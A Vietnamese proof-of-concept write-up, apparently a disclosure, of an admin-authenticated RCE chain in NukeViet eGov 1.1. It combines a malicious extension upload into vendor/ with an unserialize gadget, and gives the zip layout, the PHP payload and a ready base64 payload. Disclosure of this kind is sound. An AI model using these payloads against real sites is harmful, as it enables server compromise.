
# NukeViet eGov 1.1 – Unserialize RCE (2-bug chain)

## Bước 1 – Ghim gadget vào `vendor/` qua upload extension

**Chuẩn bị gói `fruit_poc.zip` với cấu trúc:**
```
fruit_poc.zip
├── text
├── config.ini
└── vendor/
    └── true/
        └── punycode/
            └── src/
                └── Fruit.php
```

**`Fruit.php`:**  
<img src="https://github.com/user-attachments/assets/5d1d8a27-98e4-4b79-91e7-4b95c45213bb" width="500"/>

**Upload extension:**

1. Đăng nhập vào admin panel.
2. Truy cập:  
   `http://localhost:8080/admin/index.php?language=vi&nv=extensions&op=manage`
3. Upload file `fruit_poc.zip`.
4. NukeViet sẽ tự động giải nén và ghi file `Fruit.php` vào:  
   `vendor/true/punycode/src/Fruit.php`

<img src="https://github.com/user-attachments/assets/26a0dcab-811e-4bf0-936a-f81097da1af6" width="400"/>

---

## Bước 2 – Lợi dụng `unserialize` trong `extensions/download`

**Đoạn code tại** `admin/extensions/download.php`:

<img src="https://github.com/user-attachments/assets/6df9d4bb-bb3e-4f76-9835-8246a0f8f9e8" width="450"/>

**Cơ chế:**

- PHP cấu hình `unserialize_callback_func = spl_autoload_call`
- Khi `unserialize` gặp object `TrueBV\Fruit`, autoloader sẽ tự động load file gadget đã upload ở Bước 1.

**Payload PHP:**
```php
$payload = [
    'id' => 1,
    'tid' => 1,
    'compatible' => ['id' => 1],
    0 => new TrueBV\Fruit(),
];
```

**Chuỗi base64 gửi trong tham số `data`:**
```
YTo0OntzOjI6ImlkIjtpOjE7czozOiJ0aWQiO2k6MTtzOjEwOiJjb21wYXRpYmxlIjthOjE6e3M6MjoiaWQiO2k6MTt9aTowO086MTI6IlRydWVCVlxGcnVpdCI6MDp7fX0=
```

**Request exploit (Admin access):**  
<img src="https://github.com/user-attachments/assets/88ab44e7-847b-4baa-af24-414fef185cf2" width="500"/>

---

## Bước 3 – Xác nhận RCE

- Gadget ghi kết quả thực thi lệnh `id` vào file:  
  `data/tmp/rce_test.txt`

Sau khi gửi payload, kiểm tra file kết quả:

<img src="https://github.com/user-attachments/assets/9e5678a0-cc7e-490f-ac64-3d5de29dae41"/>

---

## Kết luận

Hai lỗ hổng:

1. Upload extension cho phép ghi file vào thư mục `vendor/`
2. Unserialize object từ dữ liệu người dùng trong `extensions/download`

Kết hợp lại dẫn tới (RCE) 


